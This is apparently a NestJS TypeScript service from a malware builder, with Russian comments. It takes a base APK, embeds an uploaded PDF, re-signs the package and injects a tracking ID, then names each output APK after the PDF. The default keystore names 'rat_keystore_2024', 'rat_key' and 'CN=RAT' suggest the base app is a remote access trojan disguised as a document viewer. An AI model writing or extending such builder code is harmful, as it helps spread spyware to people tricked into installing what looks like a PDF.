import { Injectable, Logger } from '@nestjs/common';
import { join } from 'path';
import * as fs from 'fs';
import { execSync, exec } from 'child_process';
import { promisify } from 'util';
import AdmZip = require('adm-zip');
import { ApkInjectorService } from './apk-injector.service';
import { buildEvents } from '../build-events';

const execAsync = promisify(exec);

const IS_WINDOWS = process.platform === 'win32';

const KEYSTORE_PASSWORD = process.env.KEYSTORE_PASSWORD || 'rat_keystore_2024';
const KEYSTORE_ALIAS = process.env.KEYSTORE_ALIAS || 'rat_key';
const KEYSTORE_DNAME =
  process.env.KEYSTORE_DNAME || 'CN=RAT,OU=RAT,O=RAT,L=City,S=State,C=US';
const BASE_APK_FILENAME = process.env.BASE_APK_FILENAME || 'app.apk';
const KEYSTORE_FILENAME = process.env.KEYSTORE_FILENAME || 'keystore.jks';
const GENERATED_APK_DIR_NAME =
  process.env.GENERATED_APK_DIR_NAME || 'generated';
const APK_ASSETS_PDF_PATH =
  process.env.APK_ASSETS_PDF_PATH || 'assets/sample.pdf';
const PDF_ID_PREFIX = process.env.PDF_ID_PREFIX || 'pdf_id=';

/** Корень Android-проекта APK */
const APK_PROJECT_DIR =
  process.env.APK_PROJECT_DIR || join(__dirname, '..', '..', 'apk');

/** Базовый APK-файл, который будет модифицироваться */
const BASE_APK_PATH = join(APK_PROJECT_DIR, BASE_APK_FILENAME);

/** Keystore для подписи — генерируется автоматически при первом запуске */
const KEYSTORE_PATH = join(APK_PROJECT_DIR, KEYSTORE_FILENAME);

/** Папка для готовых APK (по одному на каждый pdfId) */
const GENERATED_APK_DIR = join(APK_PROJECT_DIR, GENERATED_APK_DIR_NAME);

function resolveApksignerPath(): string {
  const apksignerPath = process.env.APKSIGNER_PATH && process.env.APKSIGNER_PATH.trim();
  if (!apksignerPath) {
    throw new Error(
      'APKSIGNER_PATH is not defined in environment variables (.env)',
    );
  }
  return apksignerPath;
}

@Injectable()
export class ApkService {
  private readonly logger = new Logger(ApkService.name);
  private readonly apksignerPath: string;
  private javaHome: string | undefined;
  private buildQueue: Promise<void> = Promise.resolve();

  constructor(private readonly apkInjector: ApkInjectorService) {
    if (!fs.existsSync(GENERATED_APK_DIR)) {
      fs.mkdirSync(GENERATED_APK_DIR, { recursive: true });
    }
    this.apksignerPath = resolveApksignerPath();
    this.ensureKeystore();
  }

  private ensureKeystore(): void {
    const keytoolPath = process.env.KEYTOOL_PATH && process.env.KEYTOOL_PATH.trim();
    if (!keytoolPath) {
      throw new Error(
        'KEYTOOL_PATH is not defined in environment variables (.env)',
      );
    }

    try {
      execSync(`"${keytoolPath}" -help`, { stdio: 'pipe' });
    } catch (err) {
      throw new Error(
        `keytool executable not found or not working at: ${keytoolPath}. Please specify the correct path to keytool in .env (Error: ${err.message})`,
      );
    }

    if (process.env.JAVA_HOME) {
      this.javaHome = process.env.JAVA_HOME;
    } else if (require('path').isAbsolute(keytoolPath)) {
      this.javaHome = require('path').dirname(
        require('path').dirname(keytoolPath),
      );
    }

    if (fs.existsSync(KEYSTORE_PATH)) return;

    this.logger.log(`Generating keystore with: ${keytoolPath}`);
    execSync(
      `"${keytoolPath}" -genkeypair -v` +
      ` -keystore "${KEYSTORE_PATH}"` +
      ` -alias ${KEYSTORE_ALIAS}` +
      ` -keyalg RSA -keysize 2048 -validity 10000` +
      ` -dname "${KEYSTORE_DNAME}"`,
      { stdio: 'pipe' },
    );
    this.logger.log(`Keystore created: ${KEYSTORE_PATH}`);
  }

  getApkPath(originalName: string): string {
    const safeName = originalName
      .replace(/\.pdf$/i, '')
      .replace(/[^a-zA-Zа-яА-Я0-9_ \-]/g, '_');
    return join(GENERATED_APK_DIR, `${safeName}.apk`);
  }

  enqueueApkBuild(
    pdfId: string,
    pdfFilePath: string,
    originalName: string,
  ): void {
    this.buildQueue = this.buildQueue
      .then(() => this.runBuildPipeline(pdfId, pdfFilePath, originalName))
      .catch((err: Error) => {
        this.logger.error(`Build failed for pdfId=${pdfId}: ${err.message}`);
        buildEvents.emit('apk_error', { pdfId, error: err.message });
      });
  }

  private async runBuildPipeline(
    pdfId: string,
    pdfFilePath: string,
    originalName: string,
  ): Promise<void> {
    this.logger.log(`[${pdfId}] APK modification started`);
    buildEvents.emit('apk_building', { pdfId });

    if (!fs.existsSync(BASE_APK_PATH)) {
      throw new Error(`Base APK not found at: ${BASE_APK_PATH}`);
    }

    const unsignedTmpPath = join(GENERATED_APK_DIR, `${pdfId}-unsigned.apk`);
    const signedTmpPath = join(GENERATED_APK_DIR, `${pdfId}-signed.apk`);

    try {
      // 1. Открываем базовый APK, заменяем PDF в assets/sample.pdf и сохраняем
      const zip = new AdmZip(BASE_APK_PATH);
      const pdfBuffer = fs.readFileSync(pdfFilePath);

      // Ищем старый PDF, если есть
      const entryName = APK_ASSETS_PDF_PATH;
      const existingEntry = zip.getEntry(entryName);
      if (existingEntry) {
        zip.updateFile(existingEntry, pdfBuffer);
      } else {
        zip.addFile(entryName, pdfBuffer);
      }

      // Записываем изменённый ZIP (теряется V2 подпись, нужна переподпись)
      zip.writeZip(unsignedTmpPath);
      this.logger.log(`[${pdfId}] ZIP modified (PDF injected)`);

      // 2. Переподписываем APK (v1 + v2)
      try {
        await execAsync(
          `"${this.apksignerPath}" sign` +
          ` --ks "${KEYSTORE_PATH}"` +
          ` --ks-pass pass:${KEYSTORE_PASSWORD}` +
          ` --ks-key-alias ${KEYSTORE_ALIAS}` +
          ` --key-pass pass:${KEYSTORE_PASSWORD}` +
          ` --v1-signing-enabled true` +
          ` --v2-signing-enabled true` +
          ` --out "${signedTmpPath}"` +
          ` "${unsignedTmpPath}"`,
          { env: { ...process.env, JAVA_HOME: this.javaHome } },
        );
      } catch (signErr) {
        this.logger.error(
          `apksigner failed! stdout: ${signErr.stdout}, stderr: ${signErr.stderr}`,
        );
        throw signErr;
      }
      this.logger.log(`[${pdfId}] APK re-signed`);

      // 3. Инжект pdf_id в Signing Block
      const signedBuffer = fs.readFileSync(signedTmpPath);
      const injectedBuffer = this.apkInjector.inject(
        signedBuffer,
        `${PDF_ID_PREFIX}${pdfId}`,
      );
      fs.writeFileSync(this.getApkPath(originalName), injectedBuffer);
      this.logger.log(
        `[${pdfId}] pdf_id injected → ${this.getApkPath(originalName)}`,
      );

      buildEvents.emit('apk_ready', { pdfId });
    } finally {
      // ── Очистка временных файлов ──────────────────────────────────────────
      try {
        if (fs.existsSync(unsignedTmpPath)) fs.unlinkSync(unsignedTmpPath);
        if (fs.existsSync(signedTmpPath)) fs.unlinkSync(signedTmpPath);
        const idsigPath = signedTmpPath + '.idsig';
        if (fs.existsSync(idsigPath)) fs.unlinkSync(idsigPath);
      } catch (cleanupErr) {
        this.logger.warn(
          `Failed to cleanup temp files for ${pdfId}: ${cleanupErr.message}`,
        );
      }
    }
  }

  deleteApk(pdfId: string, originalName: string): void {
    const apkPath = this.getApkPath(originalName);
    if (fs.existsSync(apkPath)) {
      fs.unlinkSync(apkPath);
      this.logger.log(`APK deleted for pdfId: ${pdfId}`);
    } else {
      this.logger.warn(`APK not found for deletion, pdfId: ${pdfId}`);
    }
  }
}
